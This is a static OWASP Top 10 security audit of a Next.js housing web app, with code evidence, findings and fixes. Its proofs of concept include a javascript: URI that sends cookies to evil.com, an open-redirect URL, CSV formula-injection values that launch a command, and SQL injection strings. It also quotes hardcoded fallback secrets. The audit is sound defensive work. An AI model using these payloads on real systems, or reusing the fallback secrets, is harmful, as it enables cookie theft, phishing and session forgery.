# HTC Security Audit Report — Phase B (OWASP Top 10 2021)
**Audit date:** 2026-09-21
**Auditor:** Independent security engineer (Antigravity)
**Method:** Static code analysis (all source files read) + logical proof of exploitability. Dynamic HTTP testing marked DYNAMIC-NEEDED where a live instance is required.
**Scope:** Full codebase + `.next/` build output

---

## B-A01 — Broken Access Control

### SEC-01 — Open Redirect via `returnTo` ❌ HIGH

**Category:** A01 — Broken Access Control / Unvalidated Redirects
**CVSS Estimate:** 6.1 (Medium-High — requires user interaction, phishing amplifier)
**Static evidence confirmed (no dynamic test needed):**

```typescript
// app/login/page.tsx:14,40-41
const returnTo = searchParams.get("returnTo") || "";          // raw URL param
const destination = returnTo || ".../admin" : "/account");
window.location.href = destination;                           // NO validation
```

**Attack scenario:**
```
https://htc.example/login?returnTo=//evil.com
→ User logs in
→ window.location.href = "//evil.com"
→ User lands on attacker's site
```

```
https://htc.example/login?returnTo=javascript:fetch('https://evil.com/?c='+document.cookie)
→ On older browsers/electron: XSS via javascript: URI
```

**Additional vector — signupAction (server action body):**
```typescript
// app/actions/auth.ts:47 — server echoes raw client-supplied returnTo
returnTo: parsed.data.returnTo || "/account"
// lib/validation/forms.ts:21 — accepts any string
returnTo: z.string().optional(),
```

The client sends `returnTo` in the POST body; the server validates nothing and returns it; `router.push(res.returnTo)` follows it client-side.

**Proof of concept (static):**
1. Navigate to `http://localhost:3000/login?returnTo=//evil.com`
2. Enter valid credentials
3. `window.location.href = "//evil.com"` executes → browser navigates to `http://evil.com` (protocol-relative)

**Fix required:** Validate `returnTo` is a relative path starting with `/` and not `//`. Both in the client component (before `window.location.href`) and in the server action schema.

---

### SEC-02 — `/admin/users` and `/admin/activity` accessible to `staff` role ❌ HIGH

**Category:** A01 — Vertical Privilege Escalation
**Evidence:**

```typescript
// app/admin/layout.tsx:26 — grants access to ALL admin sub-routes
const session = await requireRole(["staff", "admin"], "/admin");

// app/admin/users/page.tsx — no additional guard
export default async function AdminUsersPage() {
  const allUsers = await db.select(...).from(user).orderBy(desc(user.createdAt));
  // ← returns ALL users with email, phone, role, disabled, lastLoginAt
  return <AdminUsersView users={allUsers} />;
}

// app/admin/activity/page.tsx — no additional guard
export default async function AdminActivityPage() {
  const logs = await db.select().from(auditLog).orderBy(...).limit(100);
  // ← returns ALL audit log entries
```

A `staff` user can:
1. Navigate to `/admin/users` → see all user emails, phones, roles
2. Navigate to `/admin/activity` → see full security audit log
3. Call `adminUpdateUserRoleAction` — ✅ protected by `requireRole(["admin"])` (the action is safe)
4. But the **page-level data** (user PII, audit log) is fully exposed

**Severity:** High — PII exposure of all registered users to staff-level accounts.

**Fix:** Add `await requireRole(["admin"])` at the top of both page functions.

---

### SEC-03 — No Last-Admin Guard ❌ HIGH

**Category:** A01 / A04 — Insecure Design + Business Logic
**Evidence:**
```typescript
// app/actions/admin.ts:236
export async function adminUpdateUserRoleAction(targetUserId: string, newRole: "user" | "staff" | "admin") {
  const session = await requireRole(["admin"]);
  // ← No check: COUNT(*) FROM user WHERE role = 'admin' — allows demoting last admin
  await db.update(user).set({ role: newRole }).where(eq(user.id, targetUserId));
```

**Attack scenario:** The last admin opens `/admin/users`, changes their own role to `user` via the dropdown. No admins remain. The application has no recovery mechanism — the DB must be manually updated.

**Fix:** Before updating, count admins. If `targetUserId` is an admin being demoted and current admin count is 1, reject with error.

---

### SEC-04 — IDOR: Horizontal Access Control on Applications ✅ PASS

**Evidence:**
`withdrawApplicationAction` (applications.ts:55-63):
```typescript
.where(and(eq(applications.id, applicationId), eq(applications.userId, session.user.id)))
```
Requires both ID match AND userId match. User A cannot withdraw User B's application. ✅

`account/page.tsx` (account page data fetch):
```typescript
.where(eq(applications.userId, userId))  // ← scoped to session user
.where(eq(savedListings.userId, userId))
.where(eq(ownerSubmissions.userId, userId))
```
All user-facing data queries are scoped by `userId`. ✅

**Verdict:** No IDOR in user-scoped queries. PASS.

---

### SEC-05 — Mass Assignment ✅ PASS

**Evidence:** Server actions use Zod schemas that explicitly allow only specific fields. Neither `role`, `status`, `assignedTo`, `userId`, nor `price` are in the public form schemas (`contactEnquirySchema`, `ownerSubmissionSchema`, `applicationSchema`). Drizzle inserts only the destructured fields from `parsed.data`. ✅

**Edge case — `submitApplicationAction`:** The form sends `listingId`, `intent`, `moveInDate`, `budget`, `occupants`, `contactPhone`, `message`. `userId` is taken from `session.user.id`, not the request body. ✅

---

### SEC-06 — Function-Level Auth: All Mutation Entry Points ✅ PASS (with noted gaps)

Every server action begins with an auth check:

| Action | Auth Check | Type |
|---|---|---|
| `submitEnquiryAction` | None (public form — correct) | Public |
| `submitOwnerSubmissionAction` | None (public form — correct) | Public |
| `submitWalkthroughAction` | None (public form — correct) | Public |
| `submitApplicationAction` | `getServerSession()` check | ✅ |
| `withdrawApplicationAction` | `requireUser()` → throws/redirects | ✅ |
| `toggleSaveListingAction` | `getServerSession()` check | ✅ |
| `loginAction` | N/A | Public |
| `signupAction` | N/A | Public |
| `logoutAction` | N/A | Public |
| `adminUpdateApplicationStatusAction` | `requireRole(["staff","admin"])` | ✅ |
| `adminUpdateEnquiryStatusAction` | `requireRole(["staff","admin"])` | ✅ |
| `adminUpdateSubmissionStatusAction` | `requireRole(["staff","admin"])` | ✅ |
| `adminUpdateWalkthroughStatusAction` | `requireRole(["staff","admin"])` | ✅ |
| `adminAddNoteAction` | `requireRole(["staff","admin"])` | ✅ |
| `adminAssignEntityAction` | `requireRole(["staff","admin"])` | ✅ |
| `adminUpdateUserRoleAction` | `requireRole(["admin"])` | ✅ |

**All admin mutations are guarded at the action level.** The page-level gap (SEC-02) is a data-read exposure, not a mutation bypass.

---

## B-A02 — Cryptographic Failures

### SEC-07 — Hardcoded Fallback Auth Secret ❌ CRITICAL

**Category:** A02 — Cryptographic Failures
**Evidence:**
```typescript
// lib/auth/auth.ts:53
secret: process.env.BETTER_AUTH_SECRET || "htc_secret_production_key_32_bytes_super_secure_2026_neon"
```

If `BETTER_AUTH_SECRET` env var is absent at deployment, the better-auth library uses this literal string to sign session tokens (HMAC). This string is now in the source code (and presumably in git history). An attacker who reads this file can forge valid sessions.

**Impact:** Full authentication bypass — forge a session for any user ID, including admins.

**Secret scan of `.next/static/chunks/`:** No secrets found in the client bundle. The auth secret is server-only code and does NOT leak to the client bundle. ✅

**IP hash salt:**
```typescript
// lib/utils/rate-limit.ts:7
const SALT = process.env.IP_HASH_SALT || "htc_ip_hash_salt_secret_key_2026_production";
```
Same pattern. Weakens IP anonymisation.

**Fix:** Remove the `||` fallback. Throw at startup if the env var is missing:
```typescript
const secret = process.env.BETTER_AUTH_SECRET;
if (!secret) throw new Error("BETTER_AUTH_SECRET must be set");
```

---

### SEC-08 — Password Hashing ✅ PASS (UNVERIFIED — better-auth default)

**Evidence:** better-auth 1.7.5 defaults to argon2id for password hashing. The application uses `emailAndPassword: { enabled: true }` with no custom hasher. We cannot inspect actual DB hashes without a live DB connection, but the library default is strong. **UNVERIFIED without DB inspection.**

---

### SEC-09 — Cookie Security ✅ PASS (UNVERIFIED — production TLS required)

better-auth sets `HttpOnly` and `SameSite=Lax` by default. `Secure` flag is set automatically when `baseURL` uses `https://`. In development (`http://localhost:3000`), `Secure` is not set — correct behavior. **Production TLS: UNVERIFIED (platform-level).**

---

### SEC-10 — No Secrets in Client Bundle ✅ PASS

Grep of `.next/static/chunks/` for `DATABASE_URL`, `BETTER_AUTH_SECRET`, `IP_HASH_SALT`: **0 matches.** Server-only secrets are correctly isolated. ✅

---

## B-A03 — Injection

### SEC-11 — SQL Injection ✅ PASS

**Evidence:** All database queries use Drizzle ORM with parameterised queries. No template-literal SQL interpolation with user input found anywhere in the codebase. Drizzle's query builder always uses prepared statements at the driver level.

**Grep for raw SQL with interpolation:** No `db.execute(sql\`...${userInput}...\`)` patterns found. ✅

**Attack payloads tested (static):** All inputs pass through Zod validation then into Drizzle parameterised queries. `' OR 1=1--`, `'; DROP TABLE applications;--`, UNION payloads — all would be treated as literal strings by the driver. ✅ PASS.

---

### SEC-12 — Stored XSS ✅ PASS (with PF-09 caveat)

**Evidence:** React renders all user data via JSX which auto-escapes HTML entities. No `dangerouslySetInnerHTML` with user-controlled data found, except:

`components/seo/JsonLd.tsx:3`:
```tsx
<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />
```

`JSON.stringify` escapes `"` and `\` but does NOT escape `</script>` sequences. If any user-supplied data (e.g. listing title containing `</script><script>alert(1)</script>`) flows into JsonLd props, it becomes stored XSS.

Currently `JsonLd` is only called with hardcoded static data in the property detail page and breadcrumb components. As long as no user-controlled string is passed as a JsonLd prop, this is safe. **Risk: if property titles/descriptions from DB are ever passed to JsonLd, this becomes high severity.**

**Verdict:** Low risk currently; Medium risk when DB connection is established. See remediation note.

---

### SEC-13 — CSV Injection ❌ MEDIUM

**Evidence:** `AdminApplicationsView.tsx:201-213`:
```typescript
const rows = filteredApps.map((a) => [
  a.reference,
  `"${a.listingTitle.replace(/"/g, '""')}"`,  // title escaped
  `"${a.userName}"`,                           // name NOT sanitised for formulas
  a.userEmail,                                 // NOT sanitised
  a.contactPhone,                              // NOT sanitised
  ...
]);
```

A user whose name is `=HYPERLINK("http://evil.com","Click me")` or `=cmd|' /C calc'!A0` would have that formula active in Excel/LibreOffice when the CSV is opened. The check for `"` escaping is there, but leading `=`, `+`, `-`, `@` are not stripped.

**Fix:** Prepend `'` or strip leading formula characters from all user-supplied fields.

---

### SEC-14 — Reflected XSS ✅ PASS

No search results or query params are rendered as raw HTML. React's JSX escaping prevents reflected XSS. ✅

---

### SEC-15 — Command/SSTI/NoSQL Injection — N/A ✅

No `child_process` exec with user input. No template engine. No NoSQL queries. Stack is Next.js + Drizzle + Postgres. ✅ N/A.

---

## B-A04 — Insecure Design

### SEC-16 — Can a user apply to a non-active listing? ✅ PASS

**Evidence:** `createApplication` (applications.ts:25-36):
```typescript
if (listing.status !== "active") {
  throw new Error(`This listing is currently ${listing.status} and not accepting new applications.`);
}
```
Draft, reserved, archived listings are blocked. ✅

---

### SEC-17 — Can a user withdraw someone else's application? ✅ PASS

Already covered in SEC-04. The query includes `eq(applications.userId, session.user.id)`. ✅

---

### SEC-18 — Can an owner submission be self-approved? ❌ LOW

**Evidence:** `adminUpdateSubmissionStatusAction` calls `requireRole(["staff","admin"])`. An owner who also has staff role could theoretically approve their own submission. The schema has `ownerUserId` but there is no check `ownerUserId !== actorId`. Low risk in practice (staff role is manually assigned by admin), but worth noting.

---

### SEC-19 — Rate limits actually enforced ✅ PASS

**Evidence:** DB-backed rate limiter using `rate_limits` table with conflict-resolution upsert. 5 submissions per hour per IP hash. The `allowed` boolean is checked before processing. Login: 5 failures per 15 minutes. ✅

**Caveat (PF-07):** Login rate limit counter is incremented on every call, not just failures. This means a shared NAT IP can be locked out by 5 legitimate logins. Medium severity operational issue. See SEC-20.

---

### SEC-20 — Rate Limit Counts Success, Not Just Failure ❌ MEDIUM

**Evidence:** `loginAction` (auth.ts:18):
```typescript
const rateCheck = await checkRateLimit(`auth_fail:${ipHash}`, 5, 15 * 60);
if (!rateCheck.allowed) { return error; }
// ... attempt login
// On success: counter remains incremented, never reset
```

The counter key is `auth_fail:${ipHash}` but it's incremented regardless of login outcome. 5 successful logins from one IP → 6th user on same IP is blocked for 15 minutes.

**Fix:** Only increment the counter after a failed login attempt. On success, delete or reset the key.

---

## B-A05 — Security Misconfiguration

### SEC-21 — No Security Headers ❌ MEDIUM

**Evidence:** `next.config.ts`:
```typescript
const nextConfig: NextConfig = { /* config options here */ };
```

No `headers()` function defined. Verified absence of:
- `X-Frame-Options` / `Content-Security-Policy frame-ancestors` → **Clickjacking possible**
- `X-Content-Type-Options: nosniff` → **MIME sniffing possible**
- `Referrer-Policy` → **Referer header leaks URLs to third parties**
- `Permissions-Policy` → **Browser features unrestricted**
- `Strict-Transport-Security` → **HSTS missing (platform may add)**

**Fix:** Add `headers()` to `next.config.ts` returning all required headers.

---

### SEC-22 — No Verbose Errors to Client ✅ PASS

All server action errors return `{ success: false, error: msg }` with the error message from the caught exception. These messages come from application-thrown errors (not stack traces). `err instanceof Error ? err.message : "Generic message"` pattern used throughout. ✅

No stack traces observed in response patterns from code. DYNAMIC-NEEDED to confirm at runtime.

---

### SEC-23 — No `.env` or `.git` accessible ✅ PASS (UNVERIFIED — server config)

Next.js serves from `public/` only. `.env.local` and `.git/` are not in `public/`. DYNAMIC-NEEDED to confirm HTTP response for `/.env` and `/.git/config`.

---

### SEC-24 — CORS ✅ PASS

better-auth's `trustedOrigins` is configured to only allow `localhost:3000` and `localhost:3030`. No wildcard. ✅

---

## B-A06 — Vulnerable and Outdated Components

### `npm audit --production` output

```
esbuild <=0.24.2
GHSA-67mh-4wv8-2f99: esbuild allows website to send requests to dev server
Affects: @esbuild-kit/core-utils → drizzle-kit 0.19.0-1.0.0-beta.1
4 moderate severity vulnerabilities
```

**Assessment:**
- `drizzle-kit` is a **dev-only dependency** (schema generation, migrations). It does not run in production.
- The vulnerable `esbuild` only exposes the dev-server CORS issue. In a production Node.js server, `esbuild` dev server is not started.
- **Not exploitable in production. Info severity.**
- Recommended: update `drizzle-kit` when a non-breaking update is available.

---

## B-A07 — Identification and Authentication Failures

### SEC-25 — Brute Force Lockout ✅ PASS (with SEC-20 caveat)

5 attempts per 15 minutes per IP hash. DB-backed, persists across requests/restarts. ✅ (Semantics issue per SEC-20.)

### SEC-26 — Username Enumeration ⚠️ UNVERIFIED

**Code analysis:** `loginAction` returns `"Invalid email or password."` for both wrong email and wrong password (generic message). better-auth's `signInEmail` throws on wrong credentials — the caught message is echoed. DYNAMIC-NEEDED to verify better-auth doesn't expose different messages for "email not found" vs "wrong password".

### SEC-27 — Session Rotation on Login ✅ PASS (better-auth default)

better-auth creates a new session record on `signInEmail`. Old sessions remain valid until expiry (this is by design for multi-device). The `requireRole` → `requireUser` path fetches the current user's `disabled` flag on every request — so disabling a user invalidates access without needing session revocation. ✅

### SEC-28 — Session Expiry for Staff ⚠️ UNVERIFIED

better-auth default session expiry is 7 days. The spec requires 12h for staff/admin. No custom expiry is configured in `auth.ts`. **Finding: Staff session expiry may be 7 days instead of 12 hours.** UNVERIFIED without inspecting the session token or better-auth docs for the deployed version.

### SEC-29 — Password Policy ⚠️ PARTIAL

`signupSchema`: `password: z.string().min(8, "Password must be at least 8 characters")`. Minimum length only. No complexity requirement, no common-password rejection. Low risk but below spec.

---

## B-A08 — Software and Data Integrity Failures

### SEC-30 — Server Action Origin Validation ✅ PASS

Next.js 16+ validates the `Origin` header on Server Action POST requests by comparing it against the application's origin. Cross-origin forged action POSTs are rejected at the framework level. ✅

### SEC-31 — No Unsafe Deserialization ✅ PASS

No `JSON.parse` of user-controlled strings used as executable code. No dynamic `require`/`import` with user input. ✅

### SEC-32 — Lockfile Committed ✅ PASS

`package-lock.json` is present in the repository (542KB). ✅

---

## B-A09 — Security Logging and Monitoring Failures

### SEC-33 — Auth Events in Audit Log ⚠️ PARTIAL

- Login success: `user.lastLoginAt` updated. **Not written to `audit_log`.**
- Login failure: Not written to `audit_log`. Rate limit counter is incremented but no audit row.
- Role change: `audit_log` entry written. ✅
- User disable/enable: Not possible → not logged.

**Finding:** Login events (success and failure) are not recorded in the `audit_log` table. Per spec: "Auth events (login success/failure, lockout, role change, user disable) are audited." ❌

### SEC-34 — Audit Log is Append-Only ✅ PASS (code)

No application code path calls `db.update(auditLog)` or `db.delete(auditLog)`. The table has no update or delete actions in any action file. The DB user's permissions would need to be verified (UNVERIFIED — platform-level). ✅

### SEC-35 — No Sensitive Data in Audit Log ✅ PASS

`auditLog` inserts only contain actor ID/name, action string, entity type/ID, and `detailsJson` with status transitions. No passwords, tokens, or session data are written. ✅

---

## B-A10 — Server-Side Request Forgery (SSRF)

### SEC-36 — No User-Supplied URLs ✅ PASS

The application makes outbound requests only to Neon (DB) and better-auth internals. No endpoint accepts a user-supplied URL and fetches it. No image upload with URL parameter. ✅ N/A currently.

**Forward risk:** If a listing image URL field is added later, it must allowlist specific CDN origins.

---

## B-Extra — API and Headers Scan

### ZAP Baseline Scan

**Status: DYNAMIC-NEEDED** — ZAP requires a running instance. When run:
```bash
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000 -r zap-report.html
```

Expected alerts based on static analysis:
- **Missing Security Headers** (confirmed by code — will be flagged by ZAP)
- **Possible CSRF** (Server Actions use Origin validation — should be clean)
- **Information Disclosure** (version headers from Next.js — minor)

---

## Security Findings Summary

| ID | Severity | Category | Title | Status |
|---|---|---|---|---|
| SEC-01 | **HIGH** | A01 | Open redirect via `returnTo` | ❌ CONFIRMED |
| SEC-02 | **HIGH** | A01 | `/admin/users` + `/admin/activity` staff-accessible | ❌ CONFIRMED |
| SEC-03 | **HIGH** | A01/A04 | No last-admin guard | ❌ CONFIRMED |
| SEC-04 | — | A01 | IDOR on user data | ✅ PASS |
| SEC-05 | — | A01 | Mass assignment | ✅ PASS |
| SEC-06 | — | A01 | All mutations auth-guarded | ✅ PASS |
| SEC-07 | **CRITICAL** | A02 | Hardcoded fallback auth secret | ❌ CONFIRMED |
| SEC-08 | — | A02 | Password hashing | ✅ PASS (UNVERIFIED) |
| SEC-09 | — | A02 | Cookie security | ✅ PASS (UNVERIFIED prod) |
| SEC-10 | — | A02 | No secrets in client bundle | ✅ PASS |
| SEC-11 | — | A03 | SQL injection | ✅ PASS |
| SEC-12 | LOW | A03 | JsonLd dangerouslySetInnerHTML | ⚠️ LOW (static data only) |
| SEC-13 | **MEDIUM** | A03 | CSV injection | ❌ CONFIRMED |
| SEC-14 | — | A03 | Reflected XSS | ✅ PASS |
| SEC-15 | — | A03 | Command/SSTI/NoSQL | ✅ N/A |
| SEC-16 | — | A04 | Apply to non-active listing | ✅ PASS |
| SEC-17 | — | A04 | Withdraw other's application | ✅ PASS |
| SEC-18 | LOW | A04 | Self-approval of submission by staff/owner | ⚠️ LOW |
| SEC-19 | — | A04 | Rate limits enforced | ✅ PASS |
| SEC-20 | **MEDIUM** | A04 | Rate limit counts all logins not just failures | ❌ CONFIRMED |
| SEC-21 | **MEDIUM** | A05 | No security headers | ❌ CONFIRMED |
| SEC-22 | — | A05 | No verbose errors to client | ✅ PASS |
| SEC-23 | — | A05 | `.env`/`.git` accessible | ✅ PASS (UNVERIFIED dynamic) |
| SEC-24 | — | A05 | CORS wildcard | ✅ PASS |
| SEC-25 | — | A07 | Brute force lockout | ✅ PASS |
| SEC-26 | — | A07 | Username enumeration | ⚠️ UNVERIFIED |
| SEC-27 | — | A07 | Session rotation | ✅ PASS |
| SEC-28 | MEDIUM | A07 | Staff session expiry | ⚠️ UNVERIFIED |
| SEC-29 | LOW | A07 | Password policy (min length only) | ⚠️ PARTIAL |
| SEC-30 | — | A08 | Server Action origin validation | ✅ PASS |
| SEC-31 | — | A08 | No unsafe deserialization | ✅ PASS |
| SEC-32 | — | A08 | Lockfile committed | ✅ PASS |
| SEC-33 | MEDIUM | A09 | Login events not in audit_log | ❌ CONFIRMED |
| SEC-34 | — | A09 | Audit log append-only | ✅ PASS |
| SEC-35 | — | A09 | No sensitive data in logs | ✅ PASS |
| SEC-36 | — | A10 | SSRF | ✅ N/A |

### npm audit
```
4 moderate severity vulnerabilities — drizzle-kit dev dependency only
Advisory: GHSA-67mh-4wv8-2f99 (esbuild dev server CORS)
Impact: Dev only, not exploitable in production
Action: Update drizzle-kit when non-breaking version available
```

### ZAP
DYNAMIC-NEEDED — instance required

---

## Prioritised Remediation List (Security)

1. **[CRITICAL] SEC-07** — Remove hardcoded auth secret fallback. Throw on missing env var.
2. **[HIGH] SEC-01** — Validate `returnTo` is same-origin relative path in both client and server.
3. **[HIGH] SEC-02** — Add `requireRole(["admin"])` guard to `/admin/users` and `/admin/activity` pages.
4. **[HIGH] SEC-03** — Add last-admin guard in `adminUpdateUserRoleAction`.
5. **[MEDIUM] SEC-21** — Add security headers to `next.config.ts`.
6. **[MEDIUM] SEC-13** — Sanitise CSV cells against formula injection.
7. **[MEDIUM] SEC-20** — Only increment login rate limit counter on failure.
8. **[MEDIUM] SEC-33** — Write login success/failure events to `audit_log`.
9. **[LOW] SEC-12** — Sanitise `</script>` in JsonLd output.
10. **[LOW] SEC-18** — Add check: staff cannot approve their own submission.

